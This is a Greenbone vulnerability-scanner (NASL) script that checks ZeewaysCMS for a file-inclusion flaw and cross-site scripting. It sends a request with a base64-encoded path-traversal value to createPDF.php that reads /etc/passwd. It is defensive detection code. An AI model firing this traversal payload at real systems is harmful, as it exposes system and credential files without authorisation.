# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zeewayscms:zeeway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808108");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-06-03 17:28:28 +0530 (Fri, 03 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("ZeewaysCMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"ZeewaysCMS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET method
  and checks whether we can get password information or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - When input passed via 'targeturl' GET parameter in 'createPDF.php'
    script is not properly verified before being used to include files.

  - when input passed via multiple POST parameters
    'screen_name', 'f_name', 'l_name', 'uc_email', 'uc_mobile' and 'user_contact_num'
    are not properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files via unspecified vectors and also to execute
  arbitrary script code in a user's browser session within the trust relationship
  between their browser and the server.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39784/");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_zeeways_cms_detect.nasl");
  script_mandatory_keys("ZeewaysCMS/Installed");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

url =  dir + '//createPDF.php?targeturl=Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=&&pay_id=4&&type=actual';

req = string('GET ' + url + ' HTTP/1.1\r\n',
             'Host: ' + host + '\r\n',
             '\r\n');
res1 = http_keepalive_send_recv(port:port, data:req);

if(res1 =~ "^HTTP/1\.[01] 200" && 'Content-Disposition: inline; filename="download.pdf"' >< res1 &&
   '42697473506572436f6d706f6e656e74' >< hexstr(res1) && '4372656174696f6e44617465' >< hexstr(res1)) {
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
